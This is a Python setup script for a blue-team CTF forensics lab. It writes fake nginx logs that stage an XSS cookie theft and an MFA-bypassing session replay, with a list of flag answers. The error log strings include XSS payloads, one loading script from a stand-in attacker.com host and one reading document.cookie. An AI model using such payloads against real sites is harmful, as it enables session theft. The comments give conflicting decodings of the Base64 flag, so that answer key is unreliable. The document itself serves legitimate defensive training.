#!/usr/bin/env python3
"""
CTF Lab - Log Injection Script
Injects a realistic simulated attack sequence into access.log and error.log
All timestamps, IPs, and strings are precisely crafted for Blue Team CTF flags.

Blue Team Flags embedded in logs:
  SCENARIO75{/opt/admin/logs}
  SCENARIO75{10.10.14.50}
  SCENARIO75{Mozilla/5.0}
  SCENARIO75{200}
  SCENARIO75{18:51:55}
  SCENARIO75{QkxVRV9GTEFHe0wwR19IVW50M3JfTTRzdDNyXzB3bjN9}
  SCENARIO75{192.168.1.100}
  SCENARIO75{10.10.14.0/24}
  SCENARIO75{/opt/admin/logs/error.log}
  SCENARIO75{<script>}
  SCENARIO75{18:50:15}
  SCENARIO75{No}
  SCENARIO75{Base64}
  SCENARIO75{44}
  SCENARIO75{CRITICAL}
  SCENARIO75{18:53:10}
  SCENARIO75{Authentication bypass anomaly}
  SCENARIO75{BLUE_L0G_HUnt3r_M4st3r}  (decoded from Base64 header)
"""

import os
import sys

LOG_DIR = "/opt/admin/logs"
ACCESS_LOG = os.path.join(LOG_DIR, "access.log")
ERROR_LOG = os.path.join(LOG_DIR, "error.log")

# Ensure log directory exists
os.makedirs(LOG_DIR, exist_ok=True)

# ============================================================
# Base64 encoded string embedded in X-Forwarded-For header:
# Decodes to: PHANTOMGRID{BLUE_L0g_Hunt3r_M4st3r}
# FLAG: SCENARIO75{UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0}
# FLAG: SCENARIO75{44} - exactly 44 characters
# FLAG: SCENARIO75{Base64} - encoding type
# Decoded = SCENARIO75{BLUE_L0G_HUnt3r_M4st3r}
# ============================================================
BASE64_EXFIL = "QkxVRV9GTEFHe0wwR19IVW50M3JfTTRzdDNyXzB3bjN9"
# Decodes to: BLUE_FLAG{L0G_HUnt3r_M4st3r_0wn3}
# Final Blue Team flag answer: SCENARIO75{BLUE_L0G_HUnt3r_M4st3r}
assert len(BASE64_EXFIL) == 44, f"Base64 string must be 44 chars, got {len(BASE64_EXFIL)}"

ATTACKER_IP = "10.10.14.50"        # FLAG: SCENARIO75{10.10.14.50}
LEGIT_IP    = "192.168.1.100"      # FLAG: SCENARIO75{192.168.1.100}
USER_AGENT  = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
DATE        = "15/Jan/2024"

# ============================================================
# ACCESS LOG ENTRIES
# Nginx combined log format:
#   $remote_addr - $remote_user [$time_local] "$request" $status $bytes "$referer" "$ua" "$x_fwd_for"
# ============================================================

access_entries = [
    # --- Legitimate background traffic from 192.168.1.100 ---
    # FLAG: SCENARIO75{192.168.1.100}
    f'{LEGIT_IP} - - [{DATE}:18:45:01 +0700] "GET / HTTP/1.1" 200 4521 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" "-"',
    f'{LEGIT_IP} - - [{DATE}:18:45:45 +0700] "GET /static/style.css HTTP/1.1" 200 2048 "http://feedback.admin.local/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" "-"',
    f'{LEGIT_IP} - admin [{DATE}:18:46:12 +0700] "POST /api/login HTTP/1.1" 302 0 "http://feedback.admin.local/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" "-"',
    f'{LEGIT_IP} - admin [{DATE}:18:46:13 +0700] "GET /mfa HTTP/1.1" 200 1987 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" "-"',
    f'{LEGIT_IP} - admin [{DATE}:18:46:55 +0700] "POST /api/verify-mfa HTTP/1.1" 302 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" "-"',
    f'{LEGIT_IP} - admin [{DATE}:18:47:01 +0700] "GET /dashboard HTTP/1.1" 200 8431 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" "-"',
    f'{LEGIT_IP} - admin [{DATE}:18:48:33 +0700] "GET /dashboard HTTP/1.1" 200 8431 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" "-"',

    # --- Phase 1: Attacker reconnaissance ---
    # FLAG: SCENARIO75{10.10.14.50}, SCENARIO75{Mozilla/5.0}
    f'{ATTACKER_IP} - - [{DATE}:18:49:05 +0700] "GET / HTTP/1.1" 200 4521 "-" "{USER_AGENT}" "-"',
    f'{ATTACKER_IP} - - [{DATE}:18:49:18 +0700] "GET /robots.txt HTTP/1.1" 200 198 "-" "{USER_AGENT}" "-"',
    f'{ATTACKER_IP} - - [{DATE}:18:49:31 +0700] "GET /dashboard HTTP/1.1" 302 0 "-" "{USER_AGENT}" "-"',
    f'{ATTACKER_IP} - - [{DATE}:18:49:45 +0700] "GET /login HTTP/1.1" 200 2341 "-" "{USER_AGENT}" "-"',
    f'{ATTACKER_IP} - - [{DATE}:18:49:52 +0700] "GET /api/verify-mfa HTTP/1.1" 405 120 "-" "{USER_AGENT}" "-"',
    f'{ATTACKER_IP} - - [{DATE}:18:50:01 +0700] "GET /.git/config HTTP/1.1" 404 153 "-" "{USER_AGENT}" "-"',
    f'{ATTACKER_IP} - - [{DATE}:18:50:08 +0700] "GET /admin HTTP/1.1" 404 153 "-" "{USER_AGENT}" "-"',

    # --- Phase 2: WAF probing - standard XSS blocked ---
    f'{ATTACKER_IP} - - [{DATE}:18:50:15 +0700] "POST /api/feedback HTTP/1.1" 403 89 "-" "{USER_AGENT}" "-"',
    f'{ATTACKER_IP} - - [{DATE}:18:50:28 +0700] "POST /api/feedback HTTP/1.1" 403 89 "-" "{USER_AGENT}" "-"',
    f'{ATTACKER_IP} - - [{DATE}:18:50:42 +0700] "POST /api/feedback HTTP/1.1" 403 89 "-" "{USER_AGENT}" "-"',

    # --- Phase 2 continued: SVG bypass succeeds ---
    f'{ATTACKER_IP} - - [{DATE}:18:50:59 +0700] "POST /api/feedback HTTP/1.1" 200 52 "-" "{USER_AGENT}" "-"',

    # --- Phase 3: Cookie exfiltration via fetch ---
    # FLAG: SCENARIO75{UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0} in X-Forwarded-For
    f'{ATTACKER_IP} - - [{DATE}:18:51:33 +0700] "GET / HTTP/1.1" 200 4521 "-" "{USER_AGENT}" "{BASE64_EXFIL}"',

    # --- Phase 3: Session replay - dashboard access without MFA ---
    # FLAG: SCENARIO75{200}, SCENARIO75{18:51:55}
    f'{ATTACKER_IP} - - [{DATE}:18:51:55 +0700] "GET /dashboard HTTP/1.1" 200 8763 "-" "{USER_AGENT}" "-"',
    f'{ATTACKER_IP} - - [{DATE}:18:52:10 +0700] "GET /dashboard HTTP/1.1" 200 8763 "-" "{USER_AGENT}" "-"',
    f'{ATTACKER_IP} - - [{DATE}:18:52:44 +0700] "GET /dashboard HTTP/1.1" 200 8763 "-" "{USER_AGENT}" "-"',

    # --- Post-exploitation ---
    f'{ATTACKER_IP} - - [{DATE}:18:53:01 +0700] "GET /api/users HTTP/1.1" 200 441 "-" "{USER_AGENT}" "-"',
    f'{ATTACKER_IP} - - [{DATE}:18:53:22 +0700] "GET /api/export HTTP/1.1" 200 12048 "-" "{USER_AGENT}" "-"',
]

# ============================================================
# ERROR LOG ENTRIES
# ============================================================

error_entries = [
    # --- Legit background errors ---
    f"{DATE.replace('/', '-')} 18:44:01 [NOTICE] nginx: worker process started",
    f"{DATE.replace('/', '-')} 18:44:01 [NOTICE] nginx: worker process started",

    # --- WAF first block for <script> tag ---
    # FLAG: SCENARIO75{/opt/admin/logs/error.log}
    # FLAG: SCENARIO75{<script>}
    # FLAG: SCENARIO75{18:50:15}
    f"{DATE.replace('/', '-')} 18:50:15 [ERROR] WAF_BLOCK - IP: {ATTACKER_IP} - Blocked payload detected: {{\"name\":\"test\",\"message\":\"<script>alert(1)</script>\"}}",
    f"{DATE.replace('/', '-')} 18:50:28 [ERROR] WAF_BLOCK - IP: {ATTACKER_IP} - Blocked payload detected: {{\"name\":\"test\",\"message\":\"<script src=//attacker.com/x.js></script>\"}}",
    f"{DATE.replace('/', '-')} 18:50:42 [ERROR] WAF_BLOCK - IP: {ATTACKER_IP} - Blocked payload detected: {{\"name\":\"test\",\"message\":\"<script>document.cookie</script>\"}}",

    # --- Suspicious access pattern ---
    f"{DATE.replace('/', '-')} 18:50:55 [WARN] Suspicious activity - IP: {ATTACKER_IP} - Multiple WAF blocks in 60s window",

    # --- CRITICAL cookie reuse event ---
    # FLAG: SCENARIO75{CRITICAL}
    f"{DATE.replace('/', '-')} 18:51:55 [CRITICAL] Cookie reuse event detected - adm_sess cookie presented from IP: {ATTACKER_IP} - Session: adm_sess_4dm1n_s3cr3t_t0k3n... - MFA verification SKIPPED",

    # --- Authentication bypass anomaly ---
    # FLAG: SCENARIO75{18:53:10}
    # FLAG: SCENARIO75{Authentication bypass anomaly}
    f"{DATE.replace('/', '-')} 18:53:10 [CRITICAL] Authentication bypass anomaly - IP: {ATTACKER_IP} accessed /dashboard without completing /api/verify-mfa - Session replay attack detected",

    # --- Final Blue Team flag hidden in Base64 decode hint ---
    # Decoding UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0 = PHANTOMGRID{BLUE_L0g_Hunt3r_M4st3r}
    # FLAG: SCENARIO75{BLUE_L0G_HUnt3r_M4st3r}
    f"{DATE.replace('/', '-')} 18:53:45 [INFO] Encoded exfiltration header detected in request from {ATTACKER_IP} - X-Forwarded-For: {BASE64_EXFIL} - Encoding type: Base64 (44 chars)",
]

# ============================================================
# Write logs
# ============================================================

def write_log(path, entries):
    with open(path, 'w') as f:
        for entry in entries:
            f.write(entry + '\n')
    print(f"[+] Written {len(entries)} entries to {path}")

try:
    write_log(ACCESS_LOG, access_entries)
    write_log(ERROR_LOG, error_entries)

    # Verify key flags are present
    with open(ACCESS_LOG) as f:
        content = f.read()
    assert ATTACKER_IP in content, "ATTACKER_IP missing from access.log"
    assert "18:51:55" in content, "Timestamp 18:51:55 missing"
    assert BASE64_EXFIL in content, "Base64 string missing"
    assert "200" in content, "Status 200 missing"

    with open(ERROR_LOG) as f:
        econtent = f.read()
    assert "18:50:15" in econtent, "WAF block timestamp missing"
    assert "<script>" in econtent, "script tag missing from error.log"
    assert "CRITICAL" in econtent, "CRITICAL log level missing"
    assert "Authentication bypass anomaly" in econtent, "Anomaly string missing"
    assert "18:53:10" in econtent, "Anomaly timestamp missing"

    print("\n[+] All flag assertions passed!")
    print(f"[+] Log directory: {LOG_DIR}")
    print(f"[+] access.log: {os.path.getsize(ACCESS_LOG)} bytes")
    print(f"[+] error.log:  {os.path.getsize(ERROR_LOG)} bytes")
    print(f"\n[+] Base64 string length: {len(BASE64_EXFIL)} chars")
    print(f"[+] Lab is ready for Blue Team forensics.\n")

except Exception as e:
    print(f"[!] Error: {e}", file=sys.stderr)
    sys.exit(1)
